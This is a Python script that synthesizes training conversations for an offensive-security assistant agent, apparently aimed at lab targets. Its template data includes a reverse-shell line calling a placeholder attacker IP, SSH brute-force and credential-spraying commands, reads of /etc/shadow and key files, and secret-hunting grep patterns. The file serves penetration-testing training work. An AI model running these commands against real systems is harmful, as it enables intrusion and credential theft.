"""
phase2_preprocessing/scripts/synthesize_offsec_tool_calls.py

Synthesize realistic multi-tool-call training data from R2 session patterns.

Reads converted OCO session data, extracts tool-call argument templates,
then generates synthetic conversations using NEXUS_TOOLS_V10 schemas with
offsec-appropriate content.  Replaces the generic glaive-based B+ slice
with domain-aligned data: same structural skill (2-3 calls per assistant
turn), but using the exact tools and argument shapes the model encounters
at inference.

Anti-bias measures
------------------
  - Balanced tool weights (no tool >30 % of generated calls)
  - Floor representation for all 12 NEXUS tools
  - Argument template dedup + round-robin sampling
  - Diverse scenario categories for context variety
  - Configurable target distribution via --tool-weights

Called automatically by scripts/pull_sessions_from_r2.sh after session
ingestion, or manually:

    python -m src.phase2_preprocessing.scripts.synthesize_offsec_tool_calls \
        --input  data/oco_converted/train.jsonl \
        --output data/oco_converted/synthetic_tool_calls.jsonl \
        --count  2000

"""
import argparse
import hashlib
import json
import logging
import random
import re
import sys
from collections import Counter, defaultdict
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))

from src.phase4_qwen_finetuning.hf_skills.nexus_tools import NEXUS_TOOLS_V10

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger(__name__)


# ── Balanced target distribution ────────────────────────────────────────────
# Flatter than the observed 67/22/5/4 Bash/Read/Edit/Write skew.
# Every tool gets meaningful presence; Bash is still #1 but capped.

DEFAULT_TOOL_WEIGHTS = {
    "Bash":       0.25,
    "Read":       0.18,
    "Edit":       0.12,
    "Write":      0.10,
    "Grep":       0.08,
    "Glob":       0.06,
    "WebFetch":   0.05,
    "ScopeCheck": 0.05,
    "LS":         0.04,
    "TodoWrite":  0.03,
    "Task":       0.02,
    "Skill":      0.02,
}

# ── NEXUS tools system prompt (matches inference-time format) ───────────────

NEXUS_SYSTEM_TEMPLATE = """You are an expert offensive security assistant with access to tools for penetration testing, vulnerability assessment, and security research. Always verify scope before engaging targets.

# Tools

You may call one or more functions to assist with the user query.

You are provided with function signatures within <tools></tools> XML tags:
<tools>
{tool_json_lines}
</tools>

For each function call, return a json object with function name and arguments within <tool_call></tool_call> XML tags:
<tool_call>
{{"name": <function-name>, "arguments": <args-json-object>}}
</tool_call>"""


def build_system_prompt() -> str:
    tool_lines = "\n".join(json.dumps(t) for t in NEXUS_TOOLS_V10)
    return NEXUS_SYSTEM_TEMPLATE.format(tool_json_lines=tool_lines)


# ── Supplemental argument templates for underrepresented tools ──────────────
# These fill gaps where session data has few or no examples.

SUPPLEMENTAL_ARGS: dict[str, list[dict]] = {
    "Bash": [
        {"command": "nmap -sC -sV -oN scan.txt {ip}", "description": "Service version scan with default scripts"},
        {"command": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -o dirs.txt", "description": "Directory brute-force"},
        {"command": "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,301,302", "description": "Web fuzzing for hidden paths"},
        {"command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4", "description": "SSH brute-force with common passwords"},
        {"command": "searchsploit apache 2.4.49", "description": "Search for known exploits"},
        {"command": "sqlmap -u 'http://{ip}/page?id=1' --batch --dbs", "description": "Automated SQL injection testing"},
        {"command": "nikto -h http://{ip} -o nikto.txt", "description": "Web server vulnerability scanner"},
        {"command": "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 http://{ip}/page?file=FUZZ", "description": "LFI fuzzing"},
        {"command": "crackmapexec smb {ip} -u users.txt -p passwords.txt", "description": "SMB credential spraying"},
        {"command": "enum4linux -a {ip}", "description": "SMB/NetBIOS enumeration"},
        {"command": "curl -s http://{ip}/robots.txt", "description": "Check robots.txt for hidden paths"},
        {"command": "cat /etc/passwd | grep -v nologin", "description": "List users with login shells"},
        {"command": "find / -perm -4000 -type f 2>/dev/null", "description": "Find SUID binaries for privilege escalation"},
        {"command": "sudo -l", "description": "Check sudo privileges"},
        {"command": "ss -tlnp", "description": "List listening TCP ports"},
        {"command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "description": "Spawn interactive shell"},
        {"command": "linpeas.sh | tee linpeas_output.txt", "description": "Run Linux privilege escalation scanner"},
        {"command": "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt", "description": "Crack MD5 hashes"},
        {"command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", "description": "Crack password hashes with John"},
        {"command": "wpscan --url http://{ip} --enumerate u,vp", "description": "WordPress vulnerability scan"},
    ],
    "Read": [
        {"file_path": "/etc/nginx/nginx.conf"},
        {"file_path": "/var/www/html/index.php"},
        {"file_path": "/etc/shadow"},
        {"file_path": "/home/user/.ssh/authorized_keys"},
        {"file_path": "exploit.py"},
        {"file_path": "/opt/webapp/config/database.yml"},
        {"file_path": "/var/log/auth.log", "limit": 50},
        {"file_path": "/etc/crontab"},
        {"file_path": "scan.txt"},
        {"file_path": "/etc/apache2/sites-enabled/000-default.conf"},
        {"file_path": ".env"},
        {"file_path": "/proc/version"},
    ],
    "Edit": [
        {"file_path": "exploit.py", "old_string": "TARGET = '127.0.0.1'", "new_string": "TARGET = '{ip}'", "replace_all": False},
        {"file_path": "/etc/hosts", "old_string": "", "new_string": "{ip}  target.htb", "replace_all": False},
        {"file_path": "payload.sh", "old_string": "LHOST=10.0.0.1", "new_string": "LHOST={attacker_ip}", "replace_all": True},
        {"file_path": "config.py", "old_string": "DEBUG = True", "new_string": "DEBUG = False", "replace_all": False},
    ],
    "Write": [
        {"file_path": "reverse_shell.sh", "content": "#!/bin/bash\nbash -i >& /dev/tcp/{attacker_ip}/4444 0>&1"},
        {"file_path": "notes.md", "content": "# Engagement Notes\n\n## Target: {ip}\n\n### Open Ports\n- 22/tcp SSH\n- 80/tcp HTTP\n\n### Findings\n- ..."},
        {"file_path": "enum_results.txt", "content": "Enumeration Results\n===================\nTarget: {ip}\nDate: 2024-01-15\n\nServices:\n  SSH (22) - OpenSSH 8.9p1\n  HTTP (80) - Apache 2.4.52"},
        {"file_path": "exploit.py", "content": "#!/usr/bin/env python3\nimport requests\nimport sys\n\nTARGET = sys.argv[1]\nPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n\n# CVE-2024-XXXX PoC\nurl = f'http://{{TARGET}}:{{PORT}}/vulnerable'\npayload = {{'cmd': 'id'}}\nresp = requests.post(url, json=payload)\nprint(resp.text)"},
    ],
    "Grep": [
        {"pattern": "password|passwd|secret", "path": "/var/www/html"},
        {"pattern": "PRIVATE KEY"},
        {"pattern": "api[_-]?key|token|secret", "path": "src/"},
        {"pattern": "exec\\(|system\\(|popen\\(", "path": "/var/www"},
        {"pattern": "mysql_connect|mysqli|PDO", "path": "."},
        {"pattern": "sudo|NOPASSWD", "path": "/etc"},
        {"pattern": "BEGIN (RSA|DSA|EC) PRIVATE KEY"},
        {"pattern": "credentials|auth", "path": "config/"},
    ],
    "Glob": [
        {"pattern": "**/*.conf"},
        {"pattern": "**/*.key"},
        {"pattern": "**/*.pem"},
        {"pattern": "/var/www/**/*.php"},
        {"pattern": "**/.env*"},
        {"pattern": "**/backup*"},
        {"pattern": "**/*.sql"},
        {"pattern": "**/*.log"},
        {"pattern": "/home/**/.ssh/*"},
        {"pattern": "**/*.bak"},
    ],
    "WebFetch": [
        {"url": "http://{ip}/"},
        {"url": "http://{ip}/api/v1/users"},
        {"url": "http://{ip}/admin/"},
        {"url": "http://{ip}/.git/config"},
        {"url": "http://{ip}/wp-json/wp/v2/users"},
        {"url": "https://{domain}/robots.txt"},
        {"url": "http://{ip}/server-status"},
        {"url": "http://{ip}/actuator/env"},
    ],
    "ScopeCheck": [
        {"target": "{ip}"},
        {"target": "10.10.10.0/24"},
        {"target": "{domain}"},
        {"target": "192.168.1.0/24"},
        {"target": "10.129.0.0/16"},
        {"target": "172.16.0.0/16"},
        {"target": "target.htb"},
        {"target": "app.target.com"},
    ],
    "LS": [
        {"path": "/var/www/html"},
        {"path": "/home"},
        {"path": "/opt"},
        {"path": "/tmp"},
        {"path": "."},
        {"path": "/etc/cron.d"},
        {"path": "/usr/local/bin"},
        {"path": "/var/backups"},
    ],
    "TodoWrite": [
        {"todos": [
            {"content": "Run port scan on target", "status": "completed"},
            {"content": "Enumerate web application", "status": "in_progress"},
            {"content": "Check for privilege escalation vectors", "status": "pending"},
        ]},
        {"todos": [
            {"content": "Verify target scope", "status": "completed"},
            {"content": "Identify vulnerable services", "status": "completed"},
            {"content": "Develop exploit payload", "status": "in_progress"},
            {"content": "Document findings", "status": "pending"},
        ]},
    ],
    "Task": [
        {"subagent_type": "general-purpose", "prompt": "Research CVE-2024-23897 Jenkins arbitrary file read vulnerability and summarize exploitation steps"},
        {"subagent_type": "Explore", "prompt": "Find all SQL query construction patterns in the web application source code under /var/www"},
        {"subagent_type": "general-purpose", "prompt": "Analyze the network capture in capture.pcap for credential leakage"},
    ],
    "Skill": [
        {"skill": "code-review", "args": "Review the exploit script for reliability issues"},
        {"skill": "security-review"},
    ],
}


# ── Realistic tool responses ───────────────────────────────────────────────

TOOL_RESPONSES: dict[str, list[str]] = {
    "Bash": [
        "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for {ip}\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp   open  http     Apache httpd 2.4.52\n443/tcp  open  ssl/http Apache httpd 2.4.52\nService detection performed.",
        "/admin (Status: 301)\n/api (Status: 200)\n/backup (Status: 403)\n/config (Status: 403)\n/login (Status: 200)\n/uploads (Status: 301)",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:User:/home/user:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        "/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/find\n/usr/lib/openssh/ssh-keysign",
        "User user may run the following commands on target:\n    (root) NOPASSWD: /usr/bin/vim",
        "LISTENING  0  128  0.0.0.0:22    0.0.0.0:*  users:((\"sshd\",pid=842))\nLISTENING  0  511  0.0.0.0:80    0.0.0.0:*  users:((\"apache2\",pid=1024))\nLISTENING  0  128  127.0.0.1:3306 0.0.0.0:*  users:((\"mysqld\",pid=1156))",
        "Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64",
        "[+] WordPress 6.4.2 detected\n[+] Users found:\n  - admin\n  - editor\n[!] Vulnerable plugin: contact-form-7 v5.8.3",
        "Session..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 0 (MD5)\nHash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99\nPlaintext........: password123",
    ],
    "Read": [
        "server {\n    listen 80;\n    server_name target.htb;\n    root /var/www/html;\n    index index.php;\n    location ~ \\.php$ {\n        include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/run/php/php8.1-fpm.sock;\n    }\n}",
        "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'S3cretP@ss!';\n$db_name = 'appdb';\n$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);\n?>",
        "DB_HOST=localhost\nDB_USER=admin\nDB_PASSWORD=hunter2\nSECRET_KEY=a1b2c3d4e5f6\nAPI_TOKEN=sk-test-xxxxxxxxxxxx",
        "# /etc/crontab\n*/5 * * * * root /opt/scripts/backup.sh\n0 2 * * * root /usr/local/bin/cleanup.sh",
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... user@target",
    ],
    "Edit": [
        "File edited successfully.",
        "Replaced 1 occurrence in exploit.py",
        "Replaced all occurrences (3 total) in payload.sh",
    ],
    "Write": [
        "File written: reverse_shell.sh (68 bytes)",
        "File written: notes.md (245 bytes)",
        "File written: exploit.py (312 bytes)",
    ],
    "Grep": [
        "/var/www/html/config.php:5:$db_pass = 'S3cretP@ss!';\n/var/www/html/includes/auth.php:12:$admin_password = 'changeme';",
        "src/api/auth.py:23:    api_key = os.environ.get('API_KEY', 'default-key')\nsrc/config/settings.py:8:SECRET_KEY = 'django-insecure-xxxx'",
        "/etc/sudoers:25:user ALL=(root) NOPASSWD: /usr/bin/vim",
        "config/database.yml:4:  password: productionP@ss\nconfig/secrets.yml:2:  secret_key_base: abc123def456",
    ],
    "Glob": [
        "/var/www/html/config.php\n/var/www/html/includes/db_config.php\n/opt/webapp/config.php",
        "/home/user/.ssh/id_rsa\n/home/user/.ssh/id_rsa.pub\n/home/user/.ssh/authorized_keys",
        ".env\n.env.backup\n.env.production",
        "/var/backups/db_backup_20240115.sql\n/var/backups/full_backup.tar.gz",
    ],
    "WebFetch": [
        "<html><head><title>Apache2 Default Page</title></head><body><h1>It works!</h1></body></html>",
        '{"users": [{"id": 1, "username": "admin", "role": "administrator"}, {"id": 2, "username": "user", "role": "editor"}]}',
        "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n[remote \"origin\"]\n\turl = https://git.internal.corp/webapp/main.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*",
        "HTTP/1.1 403 Forbidden\nServer: Apache/2.4.52\nContent-Type: text/html",
    ],
    "ScopeCheck": [
        "ALLOW — {ip} matches scope entry 10.10.10.0/24 (HackTheBox lab network)",
        "ALLOW — {domain} matches scope entry *.target.com",
        "DENY — 192.168.1.1 is not in any authorized scope entry",
        "ALLOW — 10.129.45.67 matches scope entry 10.129.0.0/16 (HTB VPN range)",
    ],
    "LS": [
        "index.php\nconfig.php\nassets/\nuploads/\nincludes/\nadmin/\n.htaccess",
        "user/\nadmin/\nwww-data/\nbackup/",
        "backup.sh\ncleanup.sh\ndeploy.sh\nmonitor.py",
        "auth.log\nsyslog\napache2/\nmysql/",
    ],
    "TodoWrite": [
        '[{"content":"Run port scan on target","status":"completed"},{"content":"Enumerate web application","status":"in_progress"},{"content":"Check for privilege escalation vectors","status":"pending"}]',
        '[{"content":"Verify target scope","status":"completed"},{"content":"Identify vulnerable services","status":"completed"},{"content":"Develop exploit payload","status":"in_progress"}]',
    ],
    "Task": [
        "CVE-2024-23897 is a critical Jenkins vulnerability allowing unauthenticated arbitrary file read via the CLI. Exploitation: 1) Send crafted CLI command using @/etc/passwd syntax, 2) The args4j library expands file references, 3) File contents returned in error messages. Patch: Upgrade to Jenkins 2.442+.",
        "Found 3 SQL injection patterns:\n  src/api/users.py:45 — f-string in query construction\n  src/api/search.py:23 — string concatenation with user input\n  src/models/report.py:89 — .format() with unsanitized parameter",
    ],
    "Skill": [
        "Code review complete. 2 issues found:\n  1. Command injection via unsanitized user input (line 34)\n  2. Missing error handling for network timeouts (line 67)",
        "Security review: No critical issues found. 1 low-severity finding: verbose error messages in production mode.",
    ],
}


# ── Scenario templates ──────────────────────────────────────────────────────
# Each scenario produces a (user_query, tool_calls, reasoning) tuple.
# Tools are selected from the scenario's pool, not hardcoded.

SCENARIOS = [
    {
        "category": "network_recon",
        "queries": [
            "Run a service version scan on the target at {ip} and identify potential attack vectors.",
            "I need to enumerate the target {ip}. Start with a port scan and check what's running.",
            "Perform initial reconnaissance on {ip}. Check scope first, then scan for open services.",
        ],
        "tool_pools": [
            ["ScopeCheck", "Bash"],
            ["Bash", "Bash"],
            ["ScopeCheck", "Bash", "Bash"],
        ],
        "reasoning": [
            "I'll verify the target is in scope and then run a comprehensive service scan.",
            "Let me start by scanning the target to identify open ports and services.",
            "First I need to confirm scope authorization, then enumerate the target's attack surface.",
        ],
    },
    {
        "category": "web_enumeration",
        "queries": [
            "Enumerate the web application on {ip}. Look for hidden directories and interesting files.",
            "The target at http://{ip} has a web server. Find out what's running and check for common vulnerabilities.",
            "Check the web application at {ip} for directory listings, backup files, and configuration leaks.",
        ],
        "tool_pools": [
            ["Bash", "WebFetch"],
            ["WebFetch", "Bash"],
            ["Bash", "Glob"],
            ["WebFetch", "Grep"],
        ],
        "reasoning": [
            "I'll run a directory brute-force scan and fetch key pages to understand the application.",
            "Let me check what the web server is hosting and look for common misconfigurations.",
            "I'll enumerate the web root for interesting files and check for configuration leaks.",
        ],
    },
    {
        "category": "file_analysis",
        "queries": [
            "Check the web application config files for credentials or sensitive information.",
            "Read the main configuration files and look for hardcoded secrets.",
            "I found some interesting files during enumeration. Read the config and check for credentials.",
        ],
        "tool_pools": [
            ["Read", "Read"],
            ["Glob", "Read"],
            ["Read", "Grep"],
            ["Read", "Read", "Grep"],
        ],
        "reasoning": [
            "I'll read the configuration files to look for database credentials and API keys.",
            "Let me find configuration files and check them for sensitive information.",
            "I'll examine these files for hardcoded credentials or connection strings.",
        ],
    },
    {
        "category": "exploitation",
        "queries": [
            "I found credentials in the config. Try to use them to gain access to the system.",
            "Write an exploit script for the vulnerability we identified and test it.",
            "The web application has a file inclusion vulnerability. Write a payload and test it.",
        ],
        "tool_pools": [
            ["Bash", "Bash"],
            ["Write", "Bash"],
            ["Write", "Bash", "Read"],
        ],
        "reasoning": [
            "I'll attempt to authenticate using the discovered credentials.",
            "Let me write a targeted exploit and test it against the vulnerable endpoint.",
            "I'll craft a payload for the file inclusion vulnerability and verify it works.",
        ],
    },
    {
        "category": "post_exploitation",
        "queries": [
            "I have a shell on the target. Enumerate the system for privilege escalation paths.",
            "We're in as www-data. Check what we can escalate to and gather system information.",
            "Run post-exploitation enumeration. Check users, SUID binaries, and cron jobs.",
        ],
        "tool_pools": [
            ["Bash", "Bash", "Bash"],
            ["Bash", "Read"],
            ["Bash", "Bash", "Read"],
            ["Bash", "LS"],
        ],
        "reasoning": [
            "I'll check the current user's privileges, SUID binaries, and scheduled tasks.",
            "Let me enumerate the system for privilege escalation vectors.",
            "I'll gather system information and look for misconfigurations we can exploit.",
        ],
    },
    {
        "category": "credential_analysis",
        "queries": [
            "Search the codebase for hardcoded credentials and API keys.",
            "Look for any secret keys, tokens, or passwords stored in the application files.",
            "Check the application source code and config files for credential leakage.",
        ],
        "tool_pools": [
            ["Grep", "Read"],
            ["Grep", "Grep"],
            ["Glob", "Grep", "Read"],
        ],
        "reasoning": [
            "I'll search for common credential patterns across the codebase.",
            "Let me grep for password, token, and secret patterns in the application.",
            "I'll find configuration files and search them for leaked credentials.",
        ],
    },
    {
        "category": "documentation",
        "queries": [
            "Document our findings so far. Update the todo list and write a summary of what we've found.",
            "Save the current engagement status. We found credentials and a priv-esc path.",
            "Write up the attack chain we've identified and track remaining tasks.",
        ],
        "tool_pools": [
            ["TodoWrite", "Write"],
            ["Write", "TodoWrite"],
            ["Write", "Write"],
        ],
        "reasoning": [
            "I'll update our task tracker and write a summary of the findings.",
            "Let me document the current progress and update the engagement notes.",
            "I'll save the attack chain documentation and update our task list.",
        ],
    },
    {
        "category": "scope_verification",
        "queries": [
            "Before we proceed, verify that these targets are in scope: {ip} and {domain}.",
            "Check scope for the new subnet we discovered. It looks like there might be additional hosts.",
            "I want to pivot to {ip}. Verify it's within our authorized engagement scope first.",
        ],
        "tool_pools": [
            ["ScopeCheck", "ScopeCheck"],
            ["ScopeCheck", "Bash"],
            ["ScopeCheck", "ScopeCheck", "Bash"],
        ],
        "reasoning": [
            "I'll verify both targets are within our authorized scope before proceeding.",
            "Let me check whether this subnet falls within the engagement scope.",
            "I need to confirm scope authorization before pivoting to the new target.",
        ],
    },
    {
        "category": "code_review",
        "queries": [
            "Analyze the web application source for injection vulnerabilities.",
            "Review the authentication code for weaknesses we can exploit.",
            "Check the application's input handling — look for command injection or SQLi patterns.",
        ],
        "tool_pools": [
            ["Grep", "Read", "Read"],
            ["Glob", "Read"],
            ["Grep", "Read"],
        ],
        "reasoning": [
            "I'll search for dangerous function calls and review the surrounding code.",
            "Let me find the authentication module and review it for vulnerabilities.",
            "I'll look for unsafe input handling patterns in the application.",
        ],
    },
    {
        "category": "lateral_movement",
        "queries": [
            "Check the internal network for other accessible hosts from our foothold.",
            "We have SSH keys. Try to access other machines in the network.",
            "Enumerate the network from our current position. Look for accessible services.",
        ],
        "tool_pools": [
            ["Bash", "Bash"],
            ["Read", "Bash"],
            ["Bash", "ScopeCheck", "Bash"],
        ],
        "reasoning": [
            "I'll scan the internal network to discover additional hosts and services.",
            "Let me check the SSH keys and attempt lateral movement to other systems.",
            "I'll map the internal network and verify scope before probing additional hosts.",
        ],
    },
    {
        "category": "filesystem_discovery",
        "queries": [
            "List the contents of interesting directories and look for sensitive files.",
            "Explore the file system for backup files, logs, and configuration.",
            "Check /opt, /var/backups, and the user home directories for useful files.",
        ],
        "tool_pools": [
            ["LS", "LS", "Read"],
            ["LS", "Glob"],
            ["Glob", "LS"],
            ["LS", "Read"],
        ],
        "reasoning": [
            "I'll browse the directory structure and look for interesting files.",
            "Let me check common locations for backup files and sensitive data.",
            "I'll explore these directories for files we can leverage.",
        ],
    },
    {
        "category": "config_modification",
        "queries": [
            "Modify the exploit script to target the correct IP and test it.",
            "Update the payload configuration and deploy it.",
            "Fix the reverse shell script with our listener IP and make it executable.",
        ],
        "tool_pools": [
            ["Edit", "Bash"],
            ["Edit", "Edit", "Bash"],
            ["Read", "Edit", "Bash"],
        ],
        "reasoning": [
            "I'll update the exploit parameters and run it against the target.",
            "Let me adjust the payload configuration and verify it works.",
            "I'll review the script, update the listener address, and test it.",
        ],
    },
    {
        "category": "web_recon",
        "queries": [
            "Fetch the landing page and admin panel on {ip} to map the web application.",
            "Check the API endpoints at http://{ip} for authentication weaknesses.",
            "Look for exposed .git directory and server-status pages on {ip}.",
        ],
        "tool_pools": [
            ["WebFetch", "WebFetch"],
            ["WebFetch", "Bash"],
            ["WebFetch", "WebFetch", "Read"],
        ],
        "reasoning": [
            "I'll fetch key pages to understand the web application's structure.",
            "Let me check the API surface for unauthenticated access points.",
            "I'll probe for common information disclosure endpoints.",
        ],
    },
    {
        "category": "exploit_development",
        "queries": [
            "Write a Python exploit for the SQLi we found and set up a listener.",
            "Create a reverse shell payload and modify the existing script to deliver it.",
            "Update the exploit with the correct target parameters and write the output handler.",
        ],
        "tool_pools": [
            ["Write", "Edit"],
            ["Write", "Edit", "Bash"],
            ["Edit", "Write"],
            ["Edit", "Edit"],
        ],
        "reasoning": [
            "I'll write the exploit script and update our payload configuration.",
            "Let me create the payload and modify the delivery mechanism.",
            "I'll adjust the exploit parameters and write the output processor.",
        ],
    },
    {
        "category": "service_enumeration",
        "queries": [
            "Fetch the web application pages and scan for additional services on {ip}.",
            "Check the exposed API at {ip} and search for credentials in the response.",
            "Map the web application by fetching multiple endpoints on {ip}.",
        ],
        "tool_pools": [
            ["WebFetch", "Bash"],
            ["WebFetch", "Grep"],
            ["WebFetch", "WebFetch"],
        ],
        "reasoning": [
            "I'll probe the web service and scan for other network services.",
            "Let me fetch the API responses and search for leaked credentials.",
            "I'll map the application by requesting key endpoints.",
        ],
    },
    {
        "category": "payload_preparation",
        "queries": [
            "Read the current exploit script and update it with the correct callback IP.",
            "Modify the PHP webshell to match the server configuration we discovered.",
            "Fix the path traversal payload to use the correct base directory.",
        ],
        "tool_pools": [
            ["Read", "Edit"],
            ["Read", "Edit", "Edit"],
            ["Edit", "Bash"],
        ],
        "reasoning": [
            "I'll review the exploit and update the callback configuration.",
            "Let me check the current payload and adjust it for the target environment.",
            "I'll fix the payload parameters and verify it works.",
        ],
    },
]


# ── Randomization helpers ───────────────────────────────────────────────────

def _random_ip(rng: random.Random) -> str:
    octets = [
        rng.choice(["10.10.10", "10.129", "192.168.1", "172.16.0"]),
    ]
    if octets[0] == "10.129":
        return f"10.129.{rng.randint(1,254)}.{rng.randint(1,254)}"
    return f"{octets[0]}.{rng.randint(1,254)}"


def _random_domain(rng: random.Random) -> str:
    names = ["target.htb", "app.target.com", "internal.corp.local",
             "dev.target.htb", "staging.example.com", "portal.target.htb"]
    return rng.choice(names)


def _random_attacker_ip(rng: random.Random) -> str:
    return f"10.10.14.{rng.randint(1,254)}"


def _fill_placeholders(obj, rng: random.Random):
    """Recursively replace {ip}, {domain}, {attacker_ip} in strings."""
    ip = _random_ip(rng)
    domain = _random_domain(rng)
    attacker_ip = _random_attacker_ip(rng)
    return _replace_in(obj, ip, domain, attacker_ip)


def _replace_in(obj, ip, domain, attacker_ip):
    if isinstance(obj, str):
        return obj.replace("{ip}", ip).replace("{domain}", domain).replace("{attacker_ip}", attacker_ip)
    if isinstance(obj, dict):
        return {k: _replace_in(v, ip, domain, attacker_ip) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_replace_in(v, ip, domain, attacker_ip) for v in obj]
    return obj


# ── Extraction from session data ────────────────────────────────────────────

SESSION_PATH_PATTERNS = re.compile(
    r"\.claude|claude-\d|/mnt/ssd/|/tmp/claude|scratchpad|"
    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|"
    r"kasm-user|/home/cmndcntrl|nexus-harness|nexus-mesh|"
    r"learning/wsa|code-trainer",
    re.IGNORECASE,
)

REAL_DOMAIN_PATTERN = re.compile(
    r"(starbucks|google\.|facebook|twitter|github\.com|amazon\.|youtube|"
    r"hackerone\.com|bugcrowd|linkedin|microsoft\.|openai|anthropic|"
    r"howaiworks|cloudflare\.com|huggingface|reddit\.com|stackoverflow|"
    r"wikipedia|netflix|apple\.com|instagram|tiktok)",
    re.IGNORECASE,
)

OFFSEC_URL_PATTERN = re.compile(
    r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|\.htb|\.thm|localhost|"
    r"target\.|internal\.|corp\.|staging\.|dev\.|admin\.|"
    r"\{ip\}|\{domain\})",
    re.IGNORECASE,
)


def _is_offsec_relevant(name: str, args: dict) -> bool:
    """Filter out session-specific or non-offsec argument templates."""
    args_str = json.dumps(args)

    if SESSION_PATH_PATTERNS.search(args_str):
        return False

    if REAL_DOMAIN_PATTERN.search(args_str):
        return False

    if name == "WebFetch":
        url = args.get("url", "")
        if not OFFSEC_URL_PATTERN.search(url):
            return False

    if name == "Bash":
        cmd = args.get("command", "")
        offsec_markers = (
            "nmap", "gobuster", "ffuf", "hydra", "searchsploit", "nikto",
            "sqlmap", "wfuzz", "crackmapexec", "enum4linux", "wpscan",
            "hashcat", "john", "linpeas", "find / ", "find /", "sudo -l",
            "curl ", "wget ", "nc ", "netcat", "ssh ", "scp ",
            "/etc/passwd", "/etc/shadow", "whoami", "id\n", "id ", "uname",
            "cat /", "grep -", "chmod ", "chown ", "python3 -c",
            "base64", "rev ", "xxd ", "strings ", "file ",
            "ss -", "netstat", "ifconfig", "ip addr", "arp ",
            "crontab", "cronjob", "suid", "4000",
        )
        if not any(m in cmd.lower() for m in offsec_markers):
            return False

    if name in ("Read", "Write", "Edit"):
        path = args.get("file_path", args.get("path", ""))
        content = args.get("content", "")
        if SESSION_PATH_PATTERNS.search(content):
            return False
        if REAL_DOMAIN_PATTERN.search(content):
            return False
        if path and not any(p in path for p in (
            "/etc/", "/var/www/", "/var/log/", "/var/backups/",
            "/opt/", "/tmp/", "/usr/local/", "/usr/share/",
            "/root/", "/proc/", "/sys/",
            "exploit", "payload", "scan", "notes", "loot",
            ".conf", ".php", ".py", ".sh", ".rb", ".pl",
            ".env", ".key", ".pem", ".log", ".sql", ".bak",
            ".txt", ".xml", ".yml", ".yaml", ".json", ".cfg",
        )):
            return False

    return True


def extract_arg_templates(input_path: Path) -> dict[str, list[dict]]:
    """Extract unique, sanitized argument templates from converted sessions."""
    templates: dict[str, list[dict]] = defaultdict(list)
    seen_hashes: dict[str, set] = defaultdict(set)
    rejected = Counter()

    with open(input_path) as f:
        for line in f:
            row = json.loads(line)
            for m in row["messages"]:
                if m["role"] != "assistant" or "<tool_call>" not in m["content"]:
                    continue
                for match in re.finditer(
                    r"<tool_call>\s*(\{.*?\})\s*</tool_call>",
                    m["content"],
                    re.DOTALL,
                ):
                    try:
                        tc = json.loads(match.group(1))
                    except json.JSONDecodeError:
                        continue
                    name = tc.get("name", "")
                    args = tc.get("arguments", {})
                    if not name or not args:
                        continue

                    if not _is_offsec_relevant(name, args):
                        rejected[name] += 1
                        continue

                    h = hashlib.md5(json.dumps(args, sort_keys=True).encode()).hexdigest()
                    if h in seen_hashes[name]:
                        continue
                    seen_hashes[name].add(h)
                    templates[name].append(args)

    for name, tmps in templates.items():
        rej = rejected.get(name, 0)
        logger.info("  Extracted %d unique templates for %s (filtered %d)", len(tmps), name, rej)
    return dict(templates)


def merge_template_pools(
    extracted: dict[str, list[dict]],
    supplemental: dict[str, list[dict]],
    max_per_tool: int = 30,
) -> dict[str, list[dict]]:
    """Merge extracted and supplemental templates, capping per tool."""
    merged: dict[str, list[dict]] = {}
    all_tools = set(list(extracted.keys()) + list(supplemental.keys()))

    for tool in all_tools:
        ext = extracted.get(tool, [])
        sup = supplemental.get(tool, [])
        pool = ext[:max_per_tool]
        remaining = max_per_tool - len(pool)
        if remaining > 0:
            pool.extend(sup[:remaining])
        merged[tool] = pool

    return merged


# ── Conversation generation ─────────────────────────────────────────────────

def generate_conversation(
    scenario: dict,
    arg_pools: dict[str, list[dict]],
    response_pools: dict[str, list[str]],
    rng: random.Random,
    tool_usage: Counter,
    tool_weights: dict[str, float],
) -> dict | None:
    """Generate a single synthetic multi-tool-call conversation."""
    # Pick a tool combination from the scenario's pools, preferring
    # combinations that use underrepresented tools.
    pool_options = list(scenario["tool_pools"])
    rng.shuffle(pool_options)

    tools = None
    best_score = float("inf")
    for combo in pool_options:
        score = sum(tool_usage.get(t, 0) / max(tool_weights.get(t, 0.01), 0.001) for t in combo)
        if score < best_score:
            best_score = score
            tools = combo

    if not tools or len(tools) < 2:
        return None

    query_idx = rng.randint(0, len(scenario["queries"]) - 1)
    user_query = scenario["queries"][query_idx]
